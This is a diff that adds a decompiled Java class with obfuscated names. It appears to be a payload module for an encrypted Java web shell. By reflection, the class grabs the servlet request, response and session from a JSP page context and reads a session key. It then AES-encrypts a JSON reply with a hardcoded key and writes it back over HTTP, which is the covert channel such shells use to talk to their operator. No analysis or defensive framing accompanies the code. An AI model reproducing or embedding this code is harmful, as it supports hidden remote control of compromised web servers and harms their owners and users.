@@ -1,0 +1,175 @@
+/*
+ * Decompiled with CFR.
+ */
+package org.wtkftbu.jyzaj.wfmbgdm;
+
+import java.lang.Class;
+import java.lang.Exception;
+import java.lang.Integer;
+import java.lang.Object;
+import java.lang.String;
+import java.lang.StringBuilder;
+import java.lang.System;
+import java.lang.Throwable;
+import java.lang.reflect.Method;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Random;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+
+/*
+ * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
+ */
+public class Xbmyo {
+    public static String content;
+    public static String payloadBody;
+    private Object Request;
+    private Object Response;
+    private Object Session;
+
+    public Xbmyo() {
+        content = "";
+        content = content + "wOgsFIG4WQOLKmdylWya59eySAzAzuomlgFhyDYRHGkCoZvCbZhVvlmggxT9ChutWSit0VxYwmplZsjdG4iOoOEpukZxHMgVjiU3uVaSdDinObXnqxfmJQo9wbwyU0xwciWEHHzlv2MVWa8BHrgo0KPkDxvT04FN5HZSPP0tsJPzL0ePj4D9Fd0OJXPjhOQKHbRo9ditXdegFPwhtgZOxyNN5EE0ZLz7KBo9PR0lIRN8bppbII31sqt3Vk4hLdftBaRf8NGdIgCCOykrE8KYYxQeAMuZpV2QMXW9QFEqYfGrPcocSqs6ZUGfbYlCwdiU8zIA8EIuuOWY3am6QNdWt1Mw0uGnO0P5D6KuI6fLZYhcJyJSFGITvyoBz6P1gPE1gVqY7rmSG5hpUuwgdDbEXZdde34CwK8Te7t3LKHZxfIgkW4qFmnrBWP0vDpZvJb6pFrEzyIG0uWEDIjFD7hFa2uEQRl7szv042L9Qz1PVwP1mdCxTVNLnRzGjVDoyZVXI2nfzif1YAP9H3sstBm77hlwC96rC527pweFHPFSyWxPtQ4GhRquKWsq3kBh3myUbxXJlrDeM99TYYOwflP9pWszDYSJKL5dKA60AguIceOTDDu45iiOfMcVvEv4CCTRo6UJ93CEvzpdO1wydMqi9MAyfiOoQcLfqSLA3xDb1FA6eqMtJU4GR8FrwS4LQjQhj2zUWwYvhyiZOzxPe74s14tIIyi8BYW5JRbg9UHSbc5v1c5kO9I7eoWDEtxqpsp9lWoKSS94cMlWipd3U78MrMJUIdR0rEFy4tBpI5u5wdkDAxDukyi11dgELxEjFUdnEQUuDpKaVlyrAKbh55I1fF6HpSA5c9sZm4tK0vGPB2Rl37QJjt3VFKkDin5GftU0UPKvbipJWSa7YoGsl9zapaK7AklVXY8KQkX5sGJ2U20VPpyIw0Dm6J47tmVbUWerUC4AQS4SRjXlyaMR6QW33cc511HF8vQaVMenY0jipTP7M6ymm6S3fVhaOZCqYAX5LCbMnJg46MAeDHe4vVCzO84IcQNeJl7Mxhcj4xKsa8WTL2w8tVeR5ZNj3e4WAClUf9unuoLsJybKankU4fyTgksgkWyBUfyDvWHzE9NVvN82Z4QPTLiqBkLV70V5tmLFqSv4G4tBAFu3os0YffyZVDf2nXcNV8tYccvXI9yK5wri7P8D6xItqvfZo6amP1p5kCeA5KGxCsHabDkYcn1t2oVxBA0E4fU8Ea7vCPZkwIuqnIEbTm6jiy7Noa1aBAHpc9UbKuiHun8RUGdQaSmH1iq6c4bX4KNHEc9Bhkb96bRZNp96HIrgeT1aw1Y";
+    }
+
+    /*
+     * WARNING - Removed try catching itself - possible behaviour change.
+     * Loose catch block
+     */
+    public boolean equals(Object obj) {
+        block10: {
+            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
+            this.fillContext(obj);
+            result.put("status", "success");
+            result.put("msg", content);
+            try {
+                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                Method write = so.getClass().getMethod("write", byte[].class);
+                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+            }
+            catch (Exception e) {
+                e.printStackTrace();
+            }
+            break block10;
+            catch (Exception e) {
+                try {
+                    result.put("msg", e.getMessage());
+                    result.put("status", "success");
+                }
+                catch (Throwable throwable) {
+                    try {
+                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                        Method write = so.getClass().getMethod("write", byte[].class);
+                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                    }
+                    catch (Exception e2) {
+                        e2.printStackTrace();
+                    }
+                    throw throwable;
+                }
+                try {
+                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                    Method write = so.getClass().getMethod("write", byte[].class);
+                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                }
+                catch (Exception e3) {
+                    e3.printStackTrace();
+                }
+            }
+        }
+        return true;
+    }
+
+    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        String version = System.getProperty("java.version");
+        sb.append("{");
+        for (String key : entity.keySet()) {
+            sb.append("\"" + key + "\":\"");
+            String value = entity.get(key);
+            if (encode) {
+                value = this.base64encode(value.getBytes());
+            }
+            sb.append(value);
+            sb.append("\",");
+        }
+        if (sb.toString().endsWith(",")) {
+            sb.setLength(sb.length() - 1);
+        }
+        sb.append("}");
+        return sb.toString();
+    }
+
+    private void fillContext(Object obj) throws Exception {
+        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
+            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
+            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
+        } else {
+            Map objMap = (Map)obj;
+            this.Session = objMap.get("session");
+            this.Response = objMap.get("response");
+            this.Request = objMap.get("request");
+        }
+        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+    }
+
+    private String base64encode(byte[] data) throws Exception {
+        String result = "";
+        String version = System.getProperty("java.version");
+        try {
+            this.getClass();
+            Class<?> Base64 = Class.forName("java.util.Base64");
+            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
+        }
+        catch (Throwable error) {
+            this.getClass();
+            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object Encoder = Base64.newInstance();
+            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
+            result = result.replace("\n", "").replace("\r", "");
+        }
+        return result;
+    }
+
+    private byte[] getMagic() throws Exception {
+        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+        Random random = new Random();
+        byte[] buf = new byte[magicNum];
+        for (int i = 0; i < buf.length; ++i) {
+            buf[i] = (byte)random.nextInt(256);
+        }
+        return buf;
+    }
+
+    private byte[] Encrypt(byte[] byArray) throws Exception {
+        String string = "e45e329feb5d925b";
+        byte[] byArray2 = string.getBytes("utf-8");
+        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(1, secretKeySpec);
+        byte[] byArray3 = cipher.doFinal(byArray);
+        try {
+            Class<?> clazz = Class.forName("java.util.Base64");
+            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
+            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
+        }
+        catch (Throwable throwable) {
+            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
+            Object obj = clazz.newInstance();
+            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
+            string2 = string2.replace("\n", "").replace("\r", "");
+            byArray3 = string2.getBytes();
+        }
+        return byArray3;
+    }
+}
